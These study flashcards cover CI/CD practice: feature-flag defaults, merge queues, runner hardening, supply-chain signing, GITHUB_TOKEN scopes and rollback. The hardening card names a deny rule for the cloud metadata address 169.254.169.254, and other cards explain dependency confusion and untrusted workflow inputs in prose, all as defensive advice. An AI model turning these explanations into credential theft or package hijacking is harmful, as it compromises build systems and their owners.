flashcards.back: Release toggles (days-weeks, then DELETE), experiment flags (life of the experiment), operational kill switches (permanent by design — shed a feature under load), and entitlement/permission flags (permanent; really product model, not deployment machinery). Only the first two are debt.

flashcards.front: The flag question people forget until an incident
flashcards.back: What does each flag evaluate to when the flag service is unreachable at process start, before any ruleset arrives? It must be a deliberate compiled-in default per flag, with the safe path as the fallback. A half-finished feature defaulting to 'on' turns a vendor outage into a product outage.

flashcards.front: Why do required status checks fail to keep main green?
flashcards.back: They validate a PR against main as it was, not as it will be. Two PRs each green — one renames a function, one adds a caller — merge cleanly and break main; the conflict is semantic, not textual. Fix: a merge queue that tests speculative merge commits in landing order and evicts failures.

flashcards.front: The CI metric teams forget to measure
flashcards.back: Queue time — commit pushed to job started. A 6-minute pipeline that waits 9 minutes for a runner is a 15-minute feedback loop, and no test optimisation fixes it. CI load is extremely bursty, so an autoscaler tuned for steady traffic is always behind.

flashcards.front: Self-hosted runner hardening checklist
flashcards.back: Ephemeral (one job, then destroy), never fork PRs from public repos, never share a pool across trust tiers, block egress to 169.254.169.254 (cloud metadata = the host's IAM role), run unprivileged, never mount docker.sock (that is root on the host), and use OIDC so no static cloud key sits on the box.

flashcards.front: What is dependency confusion?
flashcards.back: Your internal package name (@acme/utils) is unregistered publicly and your resolver checks a public registry first; an attacker publishes that name publicly at a higher version and your build installs their code. Fix: scope internal packages and configure the resolver so internal names never fall through to public sources.

flashcards.front: Keyless signing with cosign: what makes it 'keyless'?
flashcards.back: The CI's OIDC token is exchanged for a short-lived certificate from Fulcio, the signature is recorded in the Rekor transparency log, and the ephemeral key is discarded — there is no long-lived signing key to steal. Requires id-token: write, and you sign the DIGEST, not a tag.

flashcards.front: Signing artifacts is useless without what?
flashcards.back: Verification at the point of use. An admission controller (Kyverno, Gatekeeper, Sigstore policy-controller) must reject images lacking a valid signature from the expected certificate identity and OIDC issuer. Signing without enforcement is decoration.

flashcards.front: Least-privilege GITHUB_TOKEN: what do you set?
flashcards.back: Default the repo/org to read-only, put `permissions: contents: read` at workflow level, and grant extra scopes per job only where needed (packages: write on the publish job, id-token: write for OIDC). A test job needs nothing beyond contents: read.

flashcards.front: Which parts of the `github` context are attacker-controlled?
flashcards.back: Anything a user can type: pull request titles and bodies, branch and tag names, issue and review comments, commit messages, and author display names. Treat all of them as untrusted data — never interpolate them into a run: block, and never trust them in an `if:` that gates privilege.

flashcards.front: Cheapest CI cost levers, in order
flashcards.back: 1) Don't run it: path filters, workflow rules, cancel-in-progress on superseded runs, kill duplicate branch/MR pipelines. 2) Don't repeat it: dependency + Docker + remote build caches. 3) Right-size runner cores to actual workload parallelism. 4) Self-hosted on spot at volume. 5) Bound big matrices with max-parallel.

flashcards.front: How do you make rollback fast as a property of the system?
flashcards.back: Immutable, versioned artifacts addressed by digest, so deploying is a pointer change and the previous version still exists. Then rollback is `kubectl rollout undo`, a blue-green selector flip, or a git revert in the GitOps repo — plus retention that never deletes the running or last-known-good version, and a rehearsed rollback drill.
